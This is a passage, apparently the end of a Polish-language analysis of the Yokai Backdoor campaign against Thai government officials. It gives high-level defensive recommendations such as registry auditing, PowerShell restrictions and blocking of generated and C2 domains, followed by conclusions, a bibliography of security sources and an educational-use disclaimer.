3. **Monitorowanie i audytowanie rejestru:**
   - Włączenie logowania zmian w kluczach rejestru odpowiedzialnych za persistencję.
   - Ustanowienie alertów na nieautoryzowane modyfikacje.

4. **Zabezpieczenie PowerShell:**
   - Ograniczenie uruchamiania skryptów PowerShell do zaufanych źródeł.
   - Włączenie logowania wszystkich sesji PowerShell.

5. **Ochrona przed DGA:**
   - Użycie rozwiązań DNS, które mogą wykrywać i blokować domeny generowane dynamicznie.
   - Implementacja list blokowanych domen C2.

---

## Wnioski

*Kampania Yokai Backdoor stanowi poważne zagrożenie dla bezpieczeństwa systemów rządowych. Wykorzystanie technik DLL side-loading, zaawansowane mechanizmy persistencji oraz zabezpieczone kanały komunikacji z serwerem C2 sprawiają, że detekcja i neutralizacja tego typu ataków jest niezwykle trudna. Organizacje muszą wdrożyć kompleksowe strategie bezpieczeństwa, łączące technologię, polityki oraz edukację użytkowników, aby skutecznie przeciwdziałać takim zagrożeniom.*

**Kluczowe wnioski:**

- **Zaawansowane techniki infiltracji:** Atakujący wykorzystują nowoczesne metody, które omijają tradycyjne zabezpieczenia.
- **Wielowarstwowa ochrona:** Konieczność stosowania różnych środków bezpieczeństwa w celu minimalizacji ryzyka.
- **Edukacja użytkowników:** Świadomość zagrożeń i odpowiednie szkolenia mogą znacznie zwiększyć poziom bezpieczeństwa organizacji.
- **Stałe monitorowanie i aktualizacje:** Regularne aktualizacje systemów oraz monitorowanie aktywności sieciowej są kluczowe w wykrywaniu i reagowaniu na incydenty.

*Kampania Yokai Backdoor jest przypomnieniem, że w erze cyfrowej ciągła czujność i adaptacja do nowych zagrożeń są niezbędne dla ochrony kluczowych systemów i danych.*

---

## Bibliografia

1. **The Hacker News**: *Thai Officials Targeted in Yokai Backdoor Campaign Using DLL Side-Loading Techniques*. [Link do artykułu](https://thehackernews.com/2024/12/thai-officials-targeted-in-yokai.html)
2. **Netskope Security Efficacy Team**: *Yokai Backdoor Analysis Report*. [Link do raportu](https://www.netskope.com/blog/new-yokai-side-loaded-backdoor-targets-thai-officials)
3. **MITRE ATT&CK Framework**:
   - [DLL Side-Loading Techniques](https://attack.mitre.org/techniques/T1574/)
   - [Command and Control](https://attack.mitre.org/techniques/T1071/)
4. **CVE Details**:
   - [CVE-2017-11882](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11882)
   - [CVE-2020-0601](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-0601)
5. **Publikacje z zakresu cyberbezpieczeństwa**:
   - [FireEye: The Evolution of Cyber Attacks and Next Generation Threat Protection](https://pitb.gov.pk/system/files/Ashar_Aziz_FINAL.pdf)
   - [McAfee Labs: REvil Ransomware Uses DLL Sideloading](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/revil-ransomware-uses-dll-sideloading/)
6. **Dokumentacja Microsoft**:
   - [VirtualAlloc Function](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)
   - [CreateProcessA Function](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa)

---

*Ostrzeżenie*: Analiza złośliwego oprogramowania powinna być przeprowadzana wyłącznie przez wykwalifikowanych specjalistów w kontrolowanym środowisku. Prezentowane informacje i techniki mają charakter edukacyjny i nie powinny być wykorzystywane do celów niezgodnych z prawem lub etyką. Celem tego dokumentu jest edukacja i poprawa bezpieczeństwa systemów informatycznych.

---

> [Powrót do głównego dokumentu](README.md#kampania-yokai-backdoor)
>
> [Powrót na górę](#kampania-yokai-backdoor)